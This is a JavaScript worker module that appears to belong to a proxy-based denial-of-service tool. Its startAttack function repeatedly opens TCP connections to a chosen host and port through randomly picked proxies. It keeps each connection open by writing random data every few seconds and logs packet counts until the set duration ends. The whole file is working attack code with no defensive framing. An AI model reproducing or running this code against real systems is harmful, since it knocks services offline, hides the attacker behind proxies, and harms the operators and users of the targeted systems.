import { parentPort, workerData } from "worker_threads";

import { createTcpClient } from "../utils/clientUtils.js";
import { randomString } from "../utils/randomUtils.js";

const startAttack = () => {
  const { target, proxies, duration, packetDelay, packetSize } = workerData;

  const [targetHost, targetPort] = target.split(":");
  const port = parseInt(targetPort, 10);
  const fixedTarget = target.startsWith("http") ? target : `tcp://${target}`;

  if (isNaN(port)) throw new Error("Invalid port: Should be a number");
  if (port < 1 || port > 65535)
    throw new Error("Invalid port: Should be between 1 and 65535");

  let totalPackets = 0;
  const startTime = Date.now();

  const sendPacket = async (proxy) => {
    const socket = createTcpClient(proxy, { host: targetHost, port: port });

    socket.on("connect", () => {
      totalPackets++;

      parentPort.postMessage({
        log: `✅ Packet sent from ${proxy.protocol}://${proxy.host}:${proxy.port} to ${fixedTarget}`,
        totalPackets,
      });

      const interval = setInterval(() => {
        if (socket.writable && socket["open"]) {
          socket.write(randomString(packetSize));
        } else {
          clearInterval(interval);
        }
      }, 3000);
    });

    socket.on("error", (err) => {
      parentPort.postMessage({
        log: `❌ Packet failed from ${proxy.protocol}://${proxy.host}:${proxy.port} to ${fixedTarget}: ${err.message}`,
        totalPackets,
      });
    });
  };

  const interval = setInterval(() => {
    const elapsedTime = (Date.now() - startTime) / 1000;

    if (elapsedTime >= duration) {
      clearInterval(interval);
      parentPort.postMessage({ log: "Attack finished", totalPackets });
      process.exit(0);
    }

    const proxy = proxies[Math.floor(Math.random() * proxies.length)];
    sendPacket(proxy);
  }, packetDelay);
};

if (workerData) {
  startAttack();
}
